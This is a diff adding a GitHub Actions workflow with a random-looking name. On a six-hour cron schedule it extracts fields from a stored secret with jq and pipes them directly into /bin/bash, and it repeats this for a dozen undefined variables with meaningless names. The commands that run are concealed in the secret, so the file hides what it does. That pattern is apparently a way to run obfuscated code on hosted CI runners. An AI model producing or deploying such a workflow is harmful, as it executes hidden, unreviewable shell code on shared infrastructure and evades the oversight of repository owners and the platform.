@@ -1,0 +1,29 @@
+name: antoniofastapirapid
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: antoniofastapirapid
+        env:
+          z1: ${{ secrets.z1 }}
+        run: |
+          echo $z1 | jq -r .vdk85 | /bin/bash
+          echo $se703 | jq -r .tzk687 | /bin/bash
+          echo $kwspo5953 | jq -r .dhfkg6346 | /bin/bash
+          echo $qhpu17 | jq -r .wfa82 | /bin/bash
+          echo $lo29107 | jq -r .eyki6147 | /bin/bash
+          echo $r2502 | jq -r .gqpo0430 | /bin/bash
+          echo $k6646 | jq -r .j239 | /bin/bash
+          echo $thd30678 | jq -r .loy91771 | /bin/bash
+          echo $buwgn3 | jq -r .k929 | /bin/bash
+          echo $tt4 | jq -r .v034 | /bin/bash
+          echo $uabxl353 | jq -r .aal5 | /bin/bash
+          echo $i7 | jq -r .zkld65 | /bin/bash
+          echo $xlxjv587 | jq -r .ht7 | /bin/bash
+
